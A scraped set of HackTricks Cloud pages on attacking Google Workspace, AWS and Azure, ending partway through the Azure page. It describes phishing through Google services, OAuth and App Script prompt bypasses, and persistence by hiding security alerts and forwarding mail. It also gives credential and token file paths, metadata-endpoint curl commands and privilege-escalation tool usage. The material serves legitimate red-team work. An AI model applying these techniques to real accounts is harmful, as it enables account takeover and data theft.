        "text": "Workspace Pentesting\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nWorkspace Phishing\nGeneric Phishing Methodology\nGoogle Groups Phishing\nApparently by default in workspace members\ncan create groups\nand invite people to them\n. You can then modify the email that will be sent to the user\nadding some links.\nThe\nemail will come from a google address\n, so it will look\nlegit\nand people might click on the link.\nHangout Phishing\nYou might be able to either directly talk with a person just having their email address or send an invitation to talk. Either way, you can modify an email account maybe naming it \"Google Security\" and adding some Google logos, and the people will think they are talking to google:\nhttps://www.youtube.com/watch?v=KTVHLolz6cE&t=904s\n​\nJust the\nsame technique\ncan be used with\nGoogle Chat\n.\nGoogle Doc Phishing\nYou can create an\napparently legitimate document\nand the in a comment\nmention some email (like\n[email protected]\n)\n. Google will\nsend an email to that email address\nnotifying that they were mentioned in the document. You can\nput a link in that document\nto try to make the person access it.\nGoogle Calendar Phishing\nYou can\ncreate a calendar event\nand add as many email address of the company you are attacking as you have. Schedule this calendar event in\n5 or 15 min\nfrom the current time. Make the event look legit and\nput a comment indicating that they need to read something\n(with the\nphishing link\n).\nTo make it look less suspicious:\nSet it up so that\nreceivers cannot see the other people invited\nDo\nNOT send emails notifying about the event\n. Then, the people will only see their warning about a meeting in 5mins and that they need to read that link.\nApparently using the API you can set to\nTrue\nthat\npeople\nhave\naccepted\nthe event and even create\ncomments on their behalf\n.\nOAuth Phishing\nAny of the previous techniques might be used to make the user access a\nGoogle OAuth application\nthat will\nrequest\nthe user some\naccess\n. If the user\ntrusts\nthe\nsource\nhe might\ntrust\nthe\napplication\n(even if it's asking for high privileged permissions).\nNote that Google presents an ugly prompt asking warning that the application is untrusted in several cases and Workspace admins can even prevent people accepting OAuth applications. More on this in the OAuth section.\nPassword Spraying\nIn order to test passwords with all the emails you found (or you have generated based in a email name pattern you might have discover) you can use a tool like\nhttps://github.com/ustayready/CredKing\nwhich will use AWS lambdas to change IP address.\nOauth Apps\nGoogle\nallows to create applications that can\ninteract on behalf users\nwith several\nGoogle services\n: Gmail, Drive, GCP...\nWhen creating an application to\nact on behalf other users\n, the developer needs to create an\nOAuth app inside GCP\nand indicate the scopes (permissions) the app needs to access the users data.\nWhen a\nuser\nwants to\nuse\nthat\napplication\n, they will be\nprompted\nto\naccept\nthat the application will have access to their data specified in the scopes.\nThis is a very juicy way to\nphish\nnon-technical users into using\napplications that access sensitive information\nbecause they might not understand the consequences. However, in organizations accounts, there are ways to prevent this from happening.\nUnverified App prompt\nAs it was mentioned, google will always present a\nprompt to the user to accept\nthe permissions they are giving the application on their behalf. However, if the application is considered\ndangerous\n, google will show\nfirst\na\nprompt\nindicating that it's\ndangerous\nand\nmaking it more difficult\nfor the user to grant the permissions to the app.\nThis prompt appears in apps that:\nUse any scope that can access private data (Gmail, Drive, GCP, BigQuery...)\nApps with less than 100 users (apps > 100 a review process is also needed to stop showing the unverified prompt)\nInteresting Scopes\n​\nHere\nyou can find a list of all the Google OAuth scopes.\ncloud-platform\n: View and manage your data across\nGoogle Cloud Platform\nservices. You can impersonate the user in GCP.\ndirectory.readonly\n: See and download your organization's GSuite directory. Get names, phones, calendar URLs of all the users.\nApp Scripts\nDevelopers can create App Scripts and set them as a standalone project or bound them to Google Docs/Sheets/Slides/Forms. App Scripts is code that will be triggered when a user with editor permission access the doc (and after accepting the OAuth prompt)\nHowever, even if the app isn't verified there are a couple of ways to not show that prompt:\nIf the publisher of the app is in the same Workspace as the user accessing it\nIf the script is in a drive of the user\nCopy Document Unverified Prompt Bypass\nWhen you create a link to share a document a link similar to this one is created:\nhttps://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit\nIf you\nchange\nthe ending\n\"/edit\"\nfor\n\"/copy\"\n, instead of accessing it google will ask you if you want to\ngenerate a copy of the document.\nIf someone creates a\ncopy\nof that\ndocument\nthat\ncontained the App Script\n, he will also be\ncopying the App Script\n, therefore when he\nopens\nthe copied\nspreadsheet\n, the\nregular OAuth prompt\nwill appear\nbypassing the unverified prompt\n, because\nthe user is now the author of the App Script of the copied file\n.\nThis method will also be able to bypass the Workspace admin restriction:\nBut can be prevented with:\nShared Document Unverified Prompt Bypass\nMoreover, if someone\nshared\nwith you a document with\neditor access\n, you can generate\nApp Scripts inside the document\nand the\nOWNER (creator) of the document will be the owner of the App Script\n.\nThis means, that the\ncreator of the document will appear as creator of any App Script\nanyone with editor access creates inside of it.\nThis also means that the\nApp Script will be trusted by the Workspace environment\nof the creator of the document.\nThis also means that if an\nApp Script already existed\nand people have\ngranted access\n, anyone with\nEditor\npermission on the doc can\nmodify it and abuse that access.\nTo abuse this you also need people to trigger the App Script. And one neat trick if to\npublish the script as a web app\n. When the\npeople\nthat already granted\naccess\nto the App Script access the web page, they will\ntrigger the App Script\n(this also works using\n<img>\ntags.\nPost-Exploitation\nGoogle Groups Privesc\nBy default in workspace a\ngroup\ncan be\nfreely accessed\nby any member of the organization.\nWorkspace also allow to\ngrant permission to groups\n(even GCP permissions), so if groups can be joined and they have extra permissions, an attacker may\nabuse that path to escalate privileges\n.\nYou potentially need access to the console to join groups that allow to be joined by anyone in the org. Check groups information in\nhttps://groups.google.com/all-groups\n.\nPrivesc to GCP Summary\nAbusing the\ngoogle groups privesc\nyou might be able to escalate to a group with some kind of privileged access to GCP\nAbusing\nOAuth applications\nyou might be able to impersonate users and access to GCP on their behalf\nAccess Groups Mail info\nIf you managed to\ncompromise a google user session\n, from\nhttps://groups.google.com/all-groups\nyou can see the history of mails sent to the mail groups the user is member of, and you might find\ncredentials\nor other\nsensitive data\n.\nTakeout - Download Everything Google Knows about an account\nIf you have a\nsession inside victims google account\nyou can download everything Google saves about that account from\nhttps://takeout.google.com\n​\nVault - Download all the Workspace data of users\nIf an organization has\nGoogle Vault enabled\n, you might be able to access\nhttps://vault.google.com\nand\ndownload\nall the\ninformation\n.\nContacts download\nFrom\nhttps://contacts.google.com\nyou can download all the\ncontacts\nof the user.\nCloudsearch\nIn\nhttps://cloudsearch.google.com/\nyou can just search\nthrough all the Workspace content\n(email, drive, sites...) a user has access to. Ideal to\nquickly find sensitive information\n.\nCurrents\nIn\nhttps://currents.google.com/\nyou can access a Google\nChat\n, so you might find sensitive information in there.\nGoogle Drive Mining\nWhen\nsharing\na document yo can\nspecify\nthe\npeople\nthat can access it one by one,\nshare\nit with your\nentire company\n(\nor\nwith some specific\ngroups\n) by\ngenerating a link\n.\nWhen sharing a document, in the advance setting you can also\nallow people to search\nfor this file (by\ndefault\nthis is\ndisabled\n). However, it's important to note that once users views a document, it's searchable by them.\nFor sake of simplicity, most of the people will generate and share a link instead of adding the people that can access the document one by one.\nSome proposed ways to find all the documents:\nSearch in internal chat, forums...\nSpider\nknown\ndocuments\nsearching for\nreferences\nto other documents. You can do this within an App Script with\nPaperChaser\n​\nKeep Notes\nIn\nhttps://keep.google.com/\nyou can access the notes of the user,\nsensitive\ninformation\nmight be saved in here.\nPersistence inside a Google account\nIf you managed to\ncompromise a google user session\nand the user had\n2FA\n, you can\ngenerate\nan\napp password\nand\nregenerate the 2FA backup codes\nto know that even if the user change the password you\nwill be able to access their account\n. Another option\ninstead\nof\nregenerating\nthe codes is to\nenrol your own authenticator\napp in the 2FA.\nPersistence via OAuth Apps\nIf you have\ncompromised the account of a user,\nyou can just\naccept\nto grant all the possible permissions to an\nOAuth App\n. The only problem is that Workspace can be configure to\ndisallow unreviewed external and/or internal OAuth apps.\nIt is pretty common to not trust by default external OAuth apps but trust internal ones, so if you have\nenough permissions to generate a new OAuth application\ninside the organization and external apps are disallowed, generate it and\nuse that new internal OAuth app to maintain persistence\n.\nPersistence via delegation\nYou can just\ndelegate the account\nto a different account controlled by the attacker.\nPersistence via Android App\nIf you have a\nsession inside victims google account\nyou can browse to the\nPlay Store\nand\ninstall malware\nyou have already uploaded directly\nto the phone\nto maintain persistence and access the victims phone.\nPersistence via Gmail\nYou can create\nfilters to hide\nsecurity notifications from Google\nfrom: (\n[email protected]\n) \"Security Alert\"\nHide password reset emails\nCreate\nforwarding address to forward sensitive information\n(or everything) - You need manual access.\nCreate a forwarding address to send emails that contains the word \"password\" for example\nAdd\nrecovery email/phone under attackers control\nPersistence via\nApp Scripts\nYou can create\ntime-based triggers\nin App Scripts, so if the App Script is accepted by the user, it will be\ntriggered\neven\nwithout the user accessing it\n.\nThe docs mention that to use\nScriptApp.newTrigger(\"funcion\")\nyou need the\nscope\nscript.scriptapp\n, but\napparently thats not necessary\nas long as you have declared some other scope.\nAdministrate Workspace\nIn\nhttps://admin.google.com\n/\n, you might be able to modify the Workspace settings of the whole organization if you have enough permissions.\nYou can also find emails by searching through all the user's invoices in\nhttps://admin.google.com/ac/emaillogsearch\n​\nAccount Compromised Recovery\nLog out of all sessions\nChange user password\nGenerate new 2FA backup codes\nRemove App passwords\nRemove OAuth apps\nRemove 2FA devices\nRemove email forwarders\nRemove emails filters\nRemove recovery email/phones\nRemove bad Android Apps\nRemove bad account delegations\nReferences\n​\nhttps://www.youtube-nocookie.com/embed/6AsVUS79gLw\n- Matthew Bryant - Hacking G Suite: The Power of Dark Apps Script Magic\n​\nhttps://www.youtube.com/watch?v=KTVHLolz6cE\n- Mike Felch and Beau Bullock - OK Google, How do I Red Team GSuite?\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nPrevious\nGCP - Public Buckets Privilege Escalation\nNext\n- Pentesting Cloud\nAWS Pentesting\nLast modified\n11mo ago"
    },
    {
        "title": "AWS Pentesting",
        "url": "https://cloud.hacktricks.xyz/pentesting-cloud/aws-security",
        "text": "AWS Pentesting\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nBasic Information\nBefore start pentesting\nan\nAWS\nenvironment there are a few\nbasics things you need to know\nabout how AWS works to help you understand what you need to do, how to find misconfigurations and how to exploit them.\nConcepts such as organization hierarchy, IAM and other basic concepts are explained in:\nAWS - Basic Information\nLabs to learn\n​\nhttps://github.com/RhinoSecurityLabs/cloudgoat\n​\n​\nhttps://hackingthe.cloud/aws/capture_the_flag/cicdont/\n​\n​\nhttps://github.com/BishopFox/iam-vulnerable\n​\n​\nhttps://github.com/nccgroup/sadcloud\n​\n​\nhttps://github.com/bridgecrewio/terragoat\n​\n​\nhttps://github.com/ine-labs/AWSGoat\n​\n​\nhttp://flaws.cloud/\n​\n​\nhttp://flaws2.cloud/\n​\nTools to simulate attacks:\n​\nhttps://github.com/Datadog/stratus-red-team/\n​\n​\nhttps://github.com/sbasu7241/AWS-Threat-Simulation-and-Detection/tree/main\n​\nAWS Pentester/Red Team Methodology\nIn order to audit an AWS environment it's very important to know: which\nservices are being used\n, what is\nbeing exposed\n, who has\naccess\nto what, and how are internal AWS services an\nexternal services\nconnected.\nFrom a Red Team point of view, the\nfirst step to compromise an AWS environment\nis to manage to obtain some\ncredentials\n. Here you have some ideas on how to do that:\nLeaks\nin github (or similar) - OSINT\nSocial\nEngineering\nPassword\nreuse (password leaks)\nVulnerabilities in AWS-Hosted Applications\n​\nServer Side Request Forgery\nwith access to metadata endpoint\nLocal File Read\n/home/USERNAME/.aws/credentials\nC:\\Users\\USERNAME\\.aws\\credentials\n3rd parties\nbreached\nInternal\nEmployee\n​\nCognito\ncredentials\nOr by\ncompromising an unauthenticated service\nexposed:\nAWS - Unauthenticated Enum & Access\nOr if you are doing a\nreview\nyou could just\nask for credentials\nwith these roles:\nAWS - Permissions for a Pentest\nAfter you have managed to obtain credentials, you need to know\nto who do those creds belong\n, and\nwhat they have access to\n, so you need to perform some basic enumeration:\nBasic Enumeration\nSSRF\nIf you found a SSRF in a machine inside AWS check this page for tricks:\nCloud SSRF\nHackTricks\nWhoami\nOne of the first things you need to know is who you are (in where account you are in other info about the AWS env):\n# Easiest way, but might be monitored?\naws sts get-caller-identity\naws iam get-user\n# This will get your own user\n​\n# If you have a Key ID\naws sts get-access-key-info --access-key-id\n=\nASIA1234567890123456\n​\n# Get inside error message\naws sns publish --topic-arn arn:aws:sns:us-east-1:*account id*:aaa\n--message\naaa\n​\n# From metadata\nTOKEN\n=\n`\ncurl\n-X\nPUT\n\"http://169.254.169.254/latest/api/token\"\n-H\n\"X-aws-ec2-metadata-token-ttl-seconds: 21600\"\n`\ncurl\n-H\n\"X-aws-ec2-metadata-token:\n$TOKEN\n\"\nhttp://169.254.169.254/latest/dynamic/instance-identity/document\nNote that companies might use\ncanary tokens\nto identify when\ntokens are being stolen and used\n. It's recommended to check if a token is a canary token or not before using it.\nFor more info\ncheck this page\n.\nOrg Enumeration\nAWS - Organizations Enum\nIAM Enumeration\nIf you have enough permissions\nchecking the privileges of each entity inside the AWS account\nwill help you understand what you and other identities can do and how to\nescalate privileges\n.\nIf you don't have enough permissions to enumerate IAM, you can\nsteal bruteforce them\nto figure them out.\nCheck\nhow to do the numeration and brute-forcing\nin:\nAWS - IAM Enum\nNow that you\nhave some information about your credentials\n(and if you are a red team hopefully you\nhaven't been detected\n). It's time to figure out which services are being used in the environment.\nIn the following section you can check some ways to\nenumerate some common services.\nServices Enumeration, Post-Exploitation & Persistence\nAWS has an astonishing amount of services, in the following page you will find\nbasic information, enumeration\ncheatsheets**,** how to\navoid detection\n, obtain\npersistence\n, and other\npost-exploitation\ntricks about some of them:\nAWS - Services\nNote that you\ndon't\nneed to perform all the work\nmanually\n, below in this post you can find a\nsection about\nautomatic tools\n.\nMoreover, in this stage you might discovered\nmore services exposed to unauthenticated users,\nyou might be able to exploit them:\nAWS - Unauthenticated Enum & Access\nPrivilege Escalation\nIf you can\ncheck at least your own permissions\nover different resources you could\ncheck if you are able to obtain further permissions\n. You should focus at least in the permissions indicated in:\nAWS - Privilege Escalation\nPublicly Exposed Services\nWhile enumerating AWS services you might have found some of them\nexposing elements to the Internet\n(VM/Containers ports, databases or queue services, snapshots or buckets...).\nAs pentester/red teamer you should always check if you can find\nsensitive information / vulnerabilities\non them as they might provide you\nfurther access into the AWS account\n.\nIn this book you should find\ninformation\nabout how to find\nexposed AWS services and how to check them\n. About how to find\nvulnerabilities in exposed network services\nI would recommend you to\nsearch\nfor the specific\nservice\nin:\nHackTricks\nHackTricks\nCompromising the Organization\nFrom the root/management account\nWhen the management account creates new accounts in the organization, a\nnew role\nis created in the new account, by default named\nOrganizationAccountAccessRole\nand giving\nAdministratorAccess\npolicy to the\nmanagement account\nto access the new account.\nSo, in order to access as administrator a child account you need:\nCompromise\nthe\nmanagement\naccount and find the\nID\nof the\nchildren accounts\nand the\nnames\nof the\nrole\n(OrganizationAccountAccessRole by default) allowing the management account to access as admin.\nTo find children accounts go to the organizations section in the aws console or run\naws organizations list-accounts\nYou cannot find the name of the roles directly, so check all the custom IAM policies and search any allowing\nsts:AssumeRole\nover the previously discovered children accounts\n.\nCompromise\na\nprincipal\nin the management account with\nsts:AssumeRole\npermission over the role in the children accounts\n(even if the account is allowing anyone from the management account to impersonate, as its an external account, specific\nsts:AssumeRole\npermissions are necessary).\nAutomated Tools\nRecon\n​\naws-recon\n: A multi-threaded AWS security-focused\ninventory collection tool\nwritten in Ruby.\n# Install\ngem\ninstall\naws_recon\n​\n# Recon and get json\nAWS_PROFILE\n=<\nprofile\n>\naws_recon\n\\\n--services\nS3,EC2\n\\\n--regions\nglobal,us-east-1,us-east-2\n\\\n--verbose\n​\ncloudlist\n: Cloudlist is a\nmulti-cloud tool for getting Assets\n(Hostnames, IP Addresses) from Cloud Providers.\n​\ncloudmapper\n: CloudMapper helps you analyze your Amazon Web Services (AWS) environments. It now contains much more functionality, including auditing for security issues.\n# Installation steps in github\n# Create a config.json file with the aws info, like:\n{\n\"accounts\"\n:\n[\n{\n\"default\"\n:\ntrue,\n\"id\"\n:\n\"<account id>\"\n,\n\"name\"\n:\n\"dev\"\n}\n]\n,\n\"cidrs\"\n:\n{\n\"2.2.2.2/28\"\n:\n{\n\"name\"\n:\n\"NY Office\"\n}\n}\n}\n​\n# Enumerate\npython3 cloudmapper.py collect\n--profile\ndev\n## Number of resources discovered\npython3 cloudmapper.py stats\n--accounts\ndev\n​\n# Create HTML report\n## In the report you will find all the info already\npython3 cloudmapper.py report\n--accounts\ndev\n​\n# Identify potential issues\npython3 cloudmapper.py audit\n--accounts\ndev\n--json\n>\naudit.json\npython3 cloudmapper.py audit\n--accounts\ndev\n--markdow\n>\naudit.md\npython3 cloudmapper.py iam_report\n--accounts\ndev\n​\n# Identify admins\n## The permissions search for are in https://github.com/duo-labs/cloudmapper/blob/4df9fd7303e0337ff16a08f5e58f1d46047c4a87/shared/iam_audit.py#L163-L175\npython3 cloudmapper.py find_admins\n--accounts\ndev\n​\n# Identify unused elements\npython3 cloudmapper.py find_unused\n--accounts\ndev\n​\n# Identify publivly exposed resources\npython3 cloudmapper.py public\n--accounts\ndev\n​\npython cloudmapper.py prepare\n#Prepare webserver\npython cloudmapper.py webserver\n#Show webserver\n​\ncartography\n: Cartography is a Python tool that consolidates infrastructure assets and the relationships between them in an intuitive graph view powered by a Neo4j database.\n# Install\npip\ninstall\ncartography\n## At the time of this writting you need neo4j version 3.5.*\n​\n# Get AWS info\nAWS_PROFILE\n=\ndev cartography --neo4j-uri bolt://127.0.0.1:7687 --neo4j-password-prompt  --neo4j-user neo4j\n​\nstarbase\n: Starbase collects assets and relationships from services and systems including cloud infrastructure, SaaS applications, security controls, and more into an intuitive graph view backed by the Neo4j database.\n​\naws-inventory\n: (Uses python2) This is a tool that tries to\ndiscover all\nAWS resources\ncreated in an account.\n​\naws_public_ips\n: It's a tool to\nfetch all public IP addresses\n(both IPv4/IPv6) associated with an AWS account.\nPrivesc & Exploiting\n​\nSkyArk\n:\nDiscover the most privileged users in the scanned AWS environment, including the AWS Shadow Admins. It uses powershell. You can find the\ndefinition of privileged policies\nin the function\nCheck-PrivilegedPolicy\nin\nhttps://github.com/cyberark/SkyArk/blob/master/AWStealth/AWStealth.ps1\n.\n​\npacu\n: Pacu is an open-source\nAWS exploitation framework\n, designed for offensive security testing against cloud environments. It can\nenumerate\n, find\nmiss-configurations\nand\nexploit\nthem. You can find the\ndefinition of privileged permissions\nin\nhttps://github.com/RhinoSecurityLabs/pacu/blob/866376cd711666c775bbfcde0524c817f2c5b181/pacu/modules/iam__privesc_scan/main.py#L134\ninside the\nuser_escalation_methods\ndict.\nNote that pacu\nonly checks your own privescs paths\n(not account wide).\n# Install\n## Feel free to use venvs\npip3\ninstall\npacu\n​\n# Use pacu CLI\npacu\n>\nimport_keys\n<\nprofile_name\n>\n# import 1 profile from .aws/credentials\n>\nimport_keys\n--all\n# import all profiles\n>\nlist\n# list modules\n>\nexec\niam__enum_permissions\n# Get permissions\n>\nexec\niam__privesc_scan\n# List privileged permissions\n​\nPMapper\n: Principal Mapper (PMapper) is a script and library for identifying risks in the configuration of AWS Identity and Access Management (IAM) for an AWS account or an AWS organization. It models the different IAM Users and Roles in an account as a directed graph, which enables checks for\nprivilege escalation\nand for alternate paths an attacker could take to gain access to a resource or action in AWS. You can check the\npermissions used to find privesc\npaths in the filenames ended in\n_edges.py\nin\nhttps://github.com/nccgroup/PMapper/tree/master/principalmapper/graphing\n​\n# Install\npip\ninstall\nprincipalmapper\n​\n# Get data\npmapper\n--profile\ndev graph create\npmapper\n--profile\ndev graph display\n# Show basic info\n# Generate graph\npmapper\n--profile\ndev visualize\n# Generate svg graph file (can also be png, dot and graphml)\npmapper\n--profile\ndev visualize --only-privesc\n# Only privesc permissions\n​\n# Generate analysis\npmapper\n--profile\ndev analysis\n## Run queries\npmapper\n--profile\ndev query\n'who can do iam:CreateUser'\npmapper\n--profile\ndev query\n'preset privesc *'\n# Get privescs with admins\n​\n# Get organization hierarchy data\npmapper\n--profile\ndev orgs create\npmapper\n--profile\ndev orgs display\n​\ncloudsplaining\n: Cloudsplaining is an AWS IAM Security Assessment tool that identifies violations of least privilege and generates a risk-prioritized HTML report.\nIt will show you potentially\nover privileged\ncustomer, inline and aws\npolicies\nand which\nprincipals has access to them\n. (It not only checks for privesc but also other kind of interesting permissions, recommended to use).\n# Install\npip\ninstall\ncloudsplaining\n​\n# Download IAM policies to check\n## Only the ones attached with the versions used\ncloudsplaining download\n--profile\ndev\n​\n# Analyze the IAM policies\ncloudsplaining scan --input-file /private/tmp/cloudsplaining/dev.json\n--output\n/tmp/files/\n​\ncloudjack\n: CloudJack assesses AWS accounts for\nsubdomain hijacking vulnerabilities\nas a result of decoupled Route53 and CloudFront configurations.\n​\nccat\n: List ECR repos -> Pull ECR repo -> Backdoor it -> Push backdoored image\n​\nDufflebag\n: Dufflebag is a tool that\nsearches\nthrough public Elastic Block Storage (\nEBS) snapshots for secrets\nthat may have been accidentally left in.\nAudit\n​\ncloudsploit\n:\nCloudSploit by Aqua is an open-source project designed to allow detection of\nsecurity risks in cloud infrastructure\naccounts, including: Amazon Web Services (AWS), Microsoft Azure, Google Cloud Platform (GCP), Oracle Cloud Infrastructure (OCI), and GitHub (It doesn't look for ShadowAdmins).\n./index.js\n--csv\n=\nfile.csv\n--console\n=\ntable\n--config\n./config.js\n​\n# Compiance options: --compliance {hipaa,cis,cis1,cis2,pci}\n## use \"cis\" for cis level 1 and 2\n​\nProwler\n: Prowler is an Open Source security tool to perform AWS security best practices assessments, audits, incident response, continuous monitoring, hardening and forensics readiness.\n# Install python3, jq and git\n# Install\npip\ninstall\nprowler\nprowler\n-v\n​\n# Run\nprowler\n<\nprovider\n>\nprowler aws\n--profile\ncustom-profile\n[\n-M csv json json-asff html\n]\n​\nCloudFox\n: CloudFox helps you gain situational awareness in unfamiliar cloud environments. It’s an open source command line tool created to help penetration testers and other offensive security professionals find exploitable attack paths in cloud infrastructure.\ncloudfox aws\n--profile\n[\nprofile-name\n]\nall-checks\n​\nScoutSuite\n: Scout Suite is an open source multi-cloud security-auditing tool, which enables security posture assessment of cloud environments.\n# Install\nvirtualenv\n-p\npython3 venv\nsource\nvenv/bin/activate\npip\ninstall\nscoutsuite\nscout\n--help\n​\n# Get info\nscout aws\n-p\ndev\n​\ncs-suite\n: Cloud Security Suite (uses python2.7 and looks unmaintained)\n​\nZeus\n: Zeus is a powerful tool for AWS EC2 / S3 / CloudTrail / CloudWatch / KMS best hardening practices (looks unmaintained). It checks only default configured creds inside the system.\nConstant Audit\n​\ncloud-custodian\n: Cloud Custodian is a rules engine for managing public cloud accounts and resources. It allows users to\ndefine policies to enable a well managed cloud infrastructure\n, that's both secure and cost optimized. It consolidates many of the adhoc scripts organizations have into a lightweight and flexible tool, with unified metrics and reporting.\n​\npacbot\n: Policy as Code Bot (PacBot)\nis a platform for\ncontinuous compliance monitoring, compliance reporting and security automation for the clou\nd. In PacBot, security and compliance policies are implemented as code. All resources discovered by PacBot are evaluated against these policies to gauge policy conformance. The PacBot\nauto-fix\nframework provides the ability to automatically respond to policy violations by taking predefined actions.\n​\nstreamalert\n:\nStreamAlert is a serverless,\nreal-time\ndata analysis framework which empowers you to\ningest, analyze, and alert\non data from any environment, u\nsing data sources and alerting logic you define\n. Computer security teams use StreamAlert to scan terabytes of log data every day for incident detection and response.\nDEBUG: Capture AWS cli requests\n# Set proxy\nexport\nHTTP_PROXY\n=\nhttp://localhost:8080\nexport\nHTTPS_PROXY\n=\nhttp://localhost:8080\n​\n# Capture with burp nor verifying ssl\naws --no-verify-ssl\n..\n.\n​\n# Dowload brup cert and transform it to pem\ncurl\nhttp://127.0.0.1:8080/cert\n--output\nDownloads/certificate.cer\nopenssl x509\n-inform\nder\n-in\nDownloads/certificate.cer\n-out\nDownloads/certificate.pem\n​\n# Indicate the ca cert to trust\nexport\nAWS_CA_BUNDLE\n=~\n/Downloads/certificate.pem\n​\n# Run aws cli normally trusting burp cert\naws\n..\n.\nReferences\n​\nhttps://www.youtube.com/watch?v=8ZXRw4Ry3mQ\n​\n​\nhttps://cloudsecdocs.com/aws/defensive/tooling/audit/\n​\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nPentesting Cloud -\nPrevious\nWorkspace Pentesting\nNext\nAWS - Basic Information\nLast modified\n2mo ago"
    },
    {
        "title": "Azure Pentesting",
        "url": "https://cloud.hacktricks.xyz/pentesting-cloud/azure-security",
        "text": "Azure Pentesting\nSupport HackTricks and get benefits!\nIf you want to see your\ncompany advertised in HackTricks\nor if you want access to the\nlatest version of the PEASS or download HackTricks in PDF\nCheck the\nSUBSCRIPTION PLANS\n!\nGet the\nofficial PEASS & HackTricks swag\n​\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n​\nJoin the\n💬\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\n🐦\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nHackTricks\nand\nHackTricks Cloud\ngithub repos.\nI'M STILL BUILDING THE AZURE METHODOLOGY\nBasic Information\nAz - Basic Information\nAzure Pentester/Red Team Methodology\nIn order to audit an AZURE environment it's very important to know: which\nservices are being used\n, what is\nbeing exposed\n, who has\naccess\nto what, and how are internal Azure services and\nexternal services\nconnected.\nFrom a Red Team point of view, the\nfirst step to compromise an Azure environment\nis to manage to obtain some\ncredentials\nfor Azure AD. Here you have some ideas on how to do that:\nLeaks\nin github (or similar) - OSINT\nSocial\nEngineering\nPassword\nreuse (password leaks)\nVulnerabilities in Azure-Hosted Applications\n​\nServer Side Request Forgery\nwith access to metadata endpoint\nLocal File Read\n/home/USERNAME/.azure\nC:\\Users\\USERNAME\\.azure\nThe file\naccessTokens.json\nin\naz cli\nbefore 2.30 - Jan2022 - stored\naccess tokens in clear text\nThe file\nazureProfile.json\ncontains\ninfo\nabout logged user.\naz logout\nremoves the token.\nOlder versions of\nAz PowerShell\nstored\naccess tokens\nin\nclear\ntext in\nTokenCache.dat\n. It also stores\nServicePrincipalSecret\nin\nclear\n-text in\nAzureRmContext.json\n. The cmdlet\nSave-AzContext\ncan be used to\nstore\ntokens\n.\nUse\nDisconnect-AzAccount\nto remove them.\n3rd parties\nbreached\nInternal\nEmployee\n​\nCommon Phishing\n(credentials or Oauth App)\n​\nDevice Code Authentication Phishing\n​\n​\nAzure\nPassword Spraying\n​\nEven if you\nhaven't compromised any user\ninside the Azure tenant you are attacking, you can\ngather some information\nfrom it:\nAz - Unauthenticated Enum & Initial Entry\nAfter you have managed to obtain credentials, you need to know\nto who do those creds belong\n, and\nwhat they have access to\n, so you need to perform some basic enumeration:\nBasic Enumeration\nRemember that the\nnoisiest\npart of the enumeration is the\nlogin\n, not the enumeration itself.\nSSRF\nIf you found a SSRF in a machine inside Azure check this page for tricks:\nCloud SSRF\nHackTricks\nBypass Login Conditions\nIn cases where you have some valid credentials but you cannot login, these are some common protections that could be in place:\nIP whitelisting\n-- You need to compromise a valid IP\nGeo restrictions\n-- Find where the user lives or where are the offices of the company and get a IP from the same city (or contry at least)\nBrowser\n-- Maybe only a browser from certain OS (Windows, Linux, Mac, Android, iOS) is allowed. Find out which OS the victim/company uses.\nYou can also try to\ncompromise Service Principal credentials\nas they usually are less limited and its login is less reviewed\nAfter bypassing it, you might be able to get back to your initial setup and you will still have access.\nWhoami\nLearn\nhow to install\naz cli, AzureAD and Az PowerShell in the\nAz - AzureAD\nsection.\nOne of the first things you need to know is\nwho you are\n(in which environment you are):\naz cli\nAzureAD\nAz PowerShell\naz account list\naz account tenant list\n# Current tenant info\naz account subscription list\n# Current subscription info\naz ad signed-in-user show\n# Current signed-in user\naz ad signed-in-user list-owned-objects\n# Get owned objects by current user\naz account management-group list\n#Not allowed by default\n#Get the current session state\nGet-AzureADCurrentSessionInfo\n#Get details of the current tenant\nGet-AzureADTenantDetail\n# Get the information about the current context (Account, Tenant, Subscription etc.)\nGet-AzContext\n# List all available contexts\nGet-AzContext\n-\nListAvailable\n# Enumerate subscriptions accessible by the current user\nGet-AzSubscription\n#Get Resource group\nGet-AzResourceGroup\n# Enumerate all resources visible to the current user\nGet-AzResource\n# Enumerate all Azure RBAC role assignments\nGet-AzRoleAssignment\n# For all 